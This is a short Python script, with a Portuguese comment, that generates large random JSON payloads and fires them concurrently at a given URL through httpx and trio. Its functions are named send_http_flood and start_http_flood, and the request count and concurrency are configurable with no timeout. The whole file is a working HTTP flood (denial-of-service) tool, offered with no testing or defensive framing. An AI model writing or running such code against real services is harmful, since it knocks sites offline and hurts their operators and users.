import random
import string
from httpx import AsyncClient, Limits, Response
from loguru import logger
import trio

# Função para gerar payload de requisição
def generate_large_payload(size=8192):
    return {
        "data": ''.join(random.choices(string.ascii_letters + string.digits, k=size)),
        "list": [random.randint(0, 100) for _ in range(1000)],
        "nested": {
            "info": ''.join(random.choices(string.ascii_letters + string.digits, k=256)),
            "details": {
                "field1": random.random(),
                "field2": random.choice(['A', 'B', 'C']),
                "field3": ''.join(random.choices(string.ascii_letters, k=50))
            }
        }
    }

async def send_http_flood(client: AsyncClient, semaphore: trio.Semaphore, url: str) -> None:
    async with semaphore:
        payload = generate_large_payload(8192)
        try:
            response: Response = await client.post(url, json=payload)
            logger.info(f'Received response {response.status_code} from {url}')
        except Exception as e:
            logger.error(f'Error during HTTP flood: {e}')

async def start_http_flood(url: str, semaphore_limit: int, client_limit: int, request_count: int):
    semaphore = trio.Semaphore(semaphore_limit)
    async with AsyncClient(base_url=url, timeout=None, limits=Limits(max_connections=client_limit)) as client:
        async with trio.open_nursery() as nursery:
            for _ in range(request_count):
                nursery.start_soon(send_http_flood, client, semaphore, url)
